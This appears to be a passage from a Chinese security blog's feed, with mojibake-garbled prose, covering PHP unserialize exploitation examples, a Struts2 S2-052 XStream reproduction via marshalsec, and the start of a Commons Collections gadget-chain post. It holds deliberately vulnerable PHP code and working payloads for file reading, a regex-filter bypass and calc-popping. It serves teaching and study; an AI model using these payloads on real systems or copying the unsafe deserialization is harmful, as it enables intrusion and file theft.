      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>çœ‹å®ŒJavaçš„ååºåˆ—åŒ–ä¹‹åï¼Œå†çœ‹PHPçš„å°±å¾ˆå®¹æ˜“ï¼Œæ¯•ç«ŸPHPçš„ååºåˆ—åŒ–çš„ç»“æœæ˜¯æ–‡æœ¬æ ¼å¼ã€‚</p><h1 id="åºåˆ—åŒ–-ååºåˆ—åŒ–Demo"><a href="#åºåˆ—åŒ–-ååºåˆ—åŒ–Demo" class="headerlink" title="åºåˆ—åŒ–/ååºåˆ—åŒ–Demo"></a>åºåˆ—åŒ–/ååºåˆ—åŒ–Demo</h1><p>phpçš„åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å‡½æ•°ä¸»è¦æ˜¯serializeå’Œunserializeï¼Œå‚è€ƒâ€œ<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">æœ€é€šä¿—æ˜“æ‡‚çš„PHPååºåˆ—åŒ–åŸç†åˆ†æ</a>â€ä¸€æ–‡ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"Anemone"</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">"man"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name.<span class="string">" "</span>.<span class="keyword">$this</span>-&gt;sex.<span class="string">" "</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person();</span><br><span class="line">$person-&gt;age=<span class="number">19</span>;</span><br><span class="line"><span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">$serialized=serialize($person);</span><br><span class="line"><span class="keyword">echo</span> $serialized;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">$new_person=unserialize($serialized);</span><br><span class="line"><span class="keyword">echo</span> print_r($new_person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><a id="more"></a><p>è¿è¡Œç»“æœï¼š</p><p><img src="/ååºåˆ—åŒ–-PHPååºåˆ—åŒ–åŸºæœ¬åŸç†/1546324598743.png" alt="1546324598743"></p><h2 id="åºåˆ—åŒ–ç»“æ„"><a href="#åºåˆ—åŒ–ç»“æ„" class="headerlink" title="åºåˆ—åŒ–ç»“æ„"></a>åºåˆ—åŒ–ç»“æ„</h2><p>ä»”ç»†çœ‹ä¸€ä¸‹PHPåºåˆ—åŒ–ç»“æ„ï¼Œå¯ä»¥çœ‹åˆ°åºåˆ—åŒ–æ˜¯åªä¿å­˜å¯¹è±¡å€¼è€Œä¸ä¿å­˜å¯¹è±¡ä»£ç ï¼Œæ‰€ä»¥åœ¨javaç¯‡æ—¶æˆ‘ä»¬éœ€è¦æ„é€ POPé“¾æ¥è°ƒç”¨å·²å­˜åœ¨çš„ä»£ç ç‰‡æ®µï¼Œè¿™ä¹Ÿæ˜¯ä¸€å¼€å§‹ååºåˆ—åŒ–é—®é¢˜æ²¡æœ‰è¢«é‡è§†çš„åŸå› ã€‚</p><p><img src="/ååºåˆ—åŒ–-PHPååºåˆ—åŒ–åŸºæœ¬åŸç†/1546326095061.png" alt="1546326095061"></p><h1 id="ä¾‹é¢˜1"><a href="#ä¾‹é¢˜1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h1><p>unserialize1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªååºåˆ—åŒ–é€ æˆçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªShieldå¯¹è±¡ï¼Œå°†å…¶$fileè®¾ä¸ºè¦è¯»å–çš„æ–‡ä»¶ï¼Œå†å°†å…¶åºåˆ—åŒ–å³å¯ï¼Œæœ‰å¦‚ä¸‹payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    $x-&gt;file=<span class="string">"unserialize1.php"</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize1.php&quot;;}</code>;</p><p>ä¼ å…¥getå‚æ•°å¾—åˆ°æ–‡ä»¶ï¼š</p><p><img src="/ååºåˆ—åŒ–-PHPååºåˆ—åŒ–åŸºæœ¬åŸç†/1546327261841.png" alt="1546327261841"></p><h1 id="ä¾‹é¢˜2ï¼ˆ-æ­£åˆ™ç»•è¿‡-ï¼‰"><a href="#ä¾‹é¢˜2ï¼ˆ-æ­£åˆ™ç»•è¿‡-ï¼‰" class="headerlink" title="ä¾‹é¢˜2ï¼ˆ+æ­£åˆ™ç»•è¿‡ ï¼‰"></a>ä¾‹é¢˜2ï¼ˆ+æ­£åˆ™ç»•è¿‡ ï¼‰</h1><p>unserialize2.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°è¿‡æ»¤è§„åˆ™<code>/[oc]:\d+:/i</code>ï¼Œå› ä¸ºOæ˜¯å¯¹è±¡æ ‡è®°ï¼Œé¿å…ä¸äº†ï¼Œä½†æ˜¯åé¢çš„æ•°å­—å¯ä»¥åšç‚¹æ–‡ç« ï¼Œæ¯”å¦‚è¯´<code>O:4:&quot;baby&quot;</code>==<code>O:%2B4:&quot;baby&quot;</code>(%2Bæ˜¯ç¼–ç åçš„<code>+</code>å·ï¼Œè¿™é‡Œå‚è€ƒäº†â€<a href="https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/" target="_blank" rel="noopener">2018å¹´å®‰æ’æ¯æœˆèµ›Write Up-12æœˆèµ›æ›´æ–°</a>â€œä¸€æ–‡ï¼Œä½œè€…åœ¨è¯¥ä½ç½®ä½¿ç”¨fuzzæ¥æ‰¾åˆ°æ”¹ç¬¦å·çš„æ–¹æ³•å€¼å¾—æˆ‘ä»¬å­¦ä¹ ï¼š<code>o:%&lt;FUZZ_POINT&gt;4:&quot;baby&quot;</code>)ï¼ŒæŒ‰æ­¤æ€è·¯å…ˆç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡ï¼š</p><p>å¾—åˆ°<code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}</code>.</p><p>å†ä¼ å…¥<code>data=O:%2B4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}</code>å¾—åˆ°æ–‡ä»¶åŒ…å«ï¼š</p><p><img src="/ååºåˆ—åŒ–-PHPååºåˆ—åŒ–åŸºæœ¬åŸç†/1546328179116.png" alt="1546328179116"></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ol><li><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">æœ€é€šä¿—æ˜“æ‡‚çš„PHPååºåˆ—åŒ–åŸç†åˆ†æ</a></li><li><a href="https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/" target="_blank" rel="noopener">2018å¹´å®‰æ’æ¯æœˆèµ›Write Up-12æœˆèµ›æ›´æ–°</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–3ï¼šStruts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Struts2-052%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Struts2-052%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="éƒ¨ç½²è„†å¼±æœåŠ¡"><a href="#éƒ¨ç½²è„†å¼±æœåŠ¡" class="headerlink" title="éƒ¨ç½²è„†å¼±æœåŠ¡"></a>éƒ¨ç½²è„†å¼±æœåŠ¡</h2><p>ä¸‹è½½<a href="https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-all.zip" target="_blank" rel="noopener">struts-2.5.12-all.zip</a>ï¼Œå°† struts-2.5.12/src/apps/ ç›®å½•ä¸‹çš„ rest-showcase å¯¼å…¥ ideaï¼Œå†é…ç½®ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546071180604.png" alt="1546071180604"></p><p>è¿è¡Œåå¯ä»¥çœ‹åˆ°ä¸€ä¸ªStruts2çš„ä¸€ä¸ªDemoï¼Œå¤§æ¦‚æä¾›ä¸€ä¸ªè®¢å•æœåŠ¡ï¼Œæä¾›å¢åˆ æ”¹æŸ¥ï¼š</p><a id="more"></a><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546071610856.png" alt="1546071610856"></p><h2 id="ç”Ÿæˆæ”»å‡»è½½è·"><a href="#ç”Ÿæˆæ”»å‡»è½½è·" class="headerlink" title="ç”Ÿæˆæ”»å‡»è½½è·"></a>ç”Ÿæˆæ”»å‡»è½½è·</h2><p>ä½¿ç”¨<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsecå·¥å…·</a>ï¼Œcloneé¡¹ç›®åä½¿ç”¨<code>mvn clean package</code>ç¼–è¯‘å¾—åˆ°<code>target\marshalsec-0.0.3-SNAPSHOT.jar</code>ã€‚</p><p>ç”Ÿæˆä¸€ä¸ªå¼¹å‡ºè®¡ç®—å™¨çš„payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO <span class="string">"calc"</span> &gt; poc.xml</span><br></pre></td></tr></table></figure><h2 id="å¼¹å‡ºè®¡ç®—å™¨"><a href="#å¼¹å‡ºè®¡ç®—å™¨" class="headerlink" title="å¼¹å‡ºè®¡ç®—å™¨"></a>å¼¹å‡ºè®¡ç®—å™¨</h2><p>é€‰ä¸€ä¸ªå…ˆå‰BurpsuiteæŠ“åˆ°çš„PoståŒ…ï¼Œå°†content-typeæ”¹ä¸ºapplication/xmlï¼Œbodyéƒ¨åˆ†æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„paylodï¼Œæ”¾ä¹‹åæœåŠ¡å™¨æŠ¥é”™å¹¶ä¸”å¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546073207368.png" alt="1546073207368"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å…ˆçœ‹org.apache.struts2.rest.ContentTypeInterceptor.intercept()æ–¹æ³•ï¼Œå®ƒæ˜¯å®¢æˆ·ç«¯æ¯æ¬¡å‘é€htmlè¯·æ±‚çš„å…¥å£ï¼š</p><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546074867834.png" alt="1546074867834"></p><p>å‘ä¸‹è°ƒä¸¤æ­¥ï¼Œå¯ä»¥çœ‹åˆ°selectorå¯¹application/xmlé€‰æ‹©çš„handleræ˜¯XStreamHandlerï¼Œå†çœ‹åˆ°60è¡Œï¼Œå®ƒè°ƒç”¨äº†XStreamHandler.toObjectæ–¹æ³•ï¼Œè¿™é‡Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼š</p><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546074203978.png" alt="1546074203978"></p><p>è°ƒç”¨XStream.fromXML():</p><p><img src="/ååºåˆ—åŒ–-Struts2-052ååºåˆ—åŒ–æ¼æ´åˆ†æ/1546074176680.png" alt="1546074176680"></p><p>umarshalæ˜¯ä¸€ä¸ªå°†å·²ç»åºåˆ—åŒ–çš„xmlæ–‡æœ¬ååºåˆ—åŒ–æˆJavaå¯¹è±¡çš„å‡½æ•°ï¼Œè€Œå…ˆå‰çš„marshalsecå°±æ˜¯å°†è£…é…å¥½POPé“¾çš„ç±»åºåˆ—åŒ–æˆxmlã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ol><li><a href="http://www.zerokeeper.com/vul-analysis/analysis-of-struts2-s2052-vulnerability.html" title="struts2 s2-052 æ¼æ´åˆ†æ" target="_blank" rel="noopener">struts2 s2-052 æ¼æ´åˆ†æ</a></li><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–2ï¼šCommons Collections Javaååºåˆ—åŒ–æ¼æ´ä¸POP Gadgets</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EPOP-Gadgets/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EPOP-Gadgets/</url>
      
        <content type="html"><![CDATA[<p>åˆ©ç”¨Commons Collectionsæ”»å‡»ååºåˆ—åŒ–æ¼æ´ç”±FoxGlove Securityå›¢é˜Ÿé¦–æ¬¡æå‡ºï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡çœ‹åˆ°ååºåˆ—åŒ–ç±»å‹æ¼æ´çš„åˆ©ç”¨ï¼Œè€Œå…¶æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹åæ¥ä¹Ÿè¢«æˆä¸ºé¢å‘å±æ€§ç¼–ç¨‹ï¼ˆPOPï¼‰ï¼Œè™½ç„¶äº‹éš”ä¹…è¿œï¼Œä½†æ˜¯è¿˜æ˜¯å‚è€ƒå…ˆå‰<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Javaååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ," target="_blank" rel="noopener">å¤§ä½¬ä»¬çš„ç ”ç©¶</a>å­¦ä¹ ä¸€ä¸‹ã€‚</p><h1 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h1><a id="more"></a><p>Apache Commons Collectionsï¼ˆä»¥ä¸‹ä»£ç ä½¿ç”¨commons-collections-3.2.1.jarï¼‰æ‹“å±•äº†JavaåŸç”ŸCollectionç»“æ„çš„ç¬¬ä¸‰æ–¹åº“ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªTransformedMapç±»æ˜¯æœ¬æ–‡çš„ç ”ç©¶å¯¹è±¡ã€‚å®ƒå¯ä»¥è£…é¥°ä¸€ä¸ªåŸºæœ¬Mapï¼Œè¿”å›ä¸€ä¸ªTransformedMapï¼Œå½“æ–°å…ƒç´ åŠ å…¥TransformedMapæ—¶ä¼šå¯¹å…ƒç´ è¿›è¡Œé¢„å…ˆå®šä¹‰çš„å˜æ¢ï¼ˆTransformerï¼‰ï¼Œæ¯”å¦‚è¯´æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">"concat"</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">        new Object[]&#123;"transformed"&#125; );</span><br><span class="line">Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, invokerTransformer);</span><br><span class="line">transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåç»“æœä¸ºï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546088911400.png" alt="1546088911400"></p><p>æ³¨æ„åˆ°InvokerTransformerç±»ï¼Œå®ƒè®©æˆ‘ä»¬é€šè¿‡åå°„çš„æ–¹æ³•è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„æ–¹æ³•ï¼Œå…¶æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…ƒç´ çš„æ–¹æ³•ï¼ˆ<code>&quot;concat&quot;</code>ï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•çš„å‚æ•°ç±»å‹æ•°ç»„ï¼ˆ<code>new Class[]{String.class}</code>ï¼‰ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å…·ä½“å‚æ•°å€¼ï¼ˆ<code>new Object[]{&quot;transformed&quot;}</code>ï¼‰ï¼Œåœ¨ä¸Šé¢ä»£ç çš„Transferå®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>value.concat(&quot;transformed&quot;)</code>æ–¹æ³•ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå¯¹äºæ¯ä¸ªputè¿›æ¥çš„valueâ€”â€”æ›´å‡†ç¡®çš„è¯´æ˜¯setValue()â€”â€”éƒ½ä¼šè§¦å‘TransformedMap.checkSetValue()ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546157968457.png" alt="1546157968457"></p><p>è¯¥æ“ä½œæœ€ç»ˆè§¦å‘invokerTransformer.transform()ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546157830173.png" alt="1546157830173"></p><p>invokerTransformer.transform()æ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">InvokerTransformer invokerTransformer1 = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">    <span class="string">"concat"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">    new Object[]&#123;"transformed"&#125; );</span><br><span class="line">Object result = invokerTransformer1.transform(<span class="string">"raw"</span>) ;</span><br><span class="line">System.out.printf(result.toString());</span><br><span class="line"><span class="comment">// è¾“å‡º rawtransformed</span></span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨transformå¼¹å‡ºè®¡ç®—å™¨"><a href="#ä½¿ç”¨transformå¼¹å‡ºè®¡ç®—å™¨" class="headerlink" title="ä½¿ç”¨transformå¼¹å‡ºè®¡ç®—å™¨"></a>ä½¿ç”¨transformå¼¹å‡ºè®¡ç®—å™¨</h2><p>å¦‚æœæˆ‘ä»¬transformçš„å¯¹è±¡å°±æ˜¯Runtimeï¼Œé‚£æƒ…å†µå°±å¾ˆå¥½åŠäº†ï¼Œç›´æ¥è°ƒç”¨å®ƒçš„exec(â€œcalcâ€)æ–¹æ³•å°±è¡Œäº†ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546089796235.png" alt="1546089796235"></p><h2 id="æ„é€ Transformeré“¾"><a href="#æ„é€ Transformeré“¾" class="headerlink" title="æ„é€ Transformeré“¾"></a>æ„é€ Transformeré“¾</h2><p>ä½†æ˜¯TransformedMapæ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šå»æ”¾Runtimeç±»å‹ï¼ˆå°±åƒæ–‡ç« å¼€å¤´ä»£ç é‚£æ 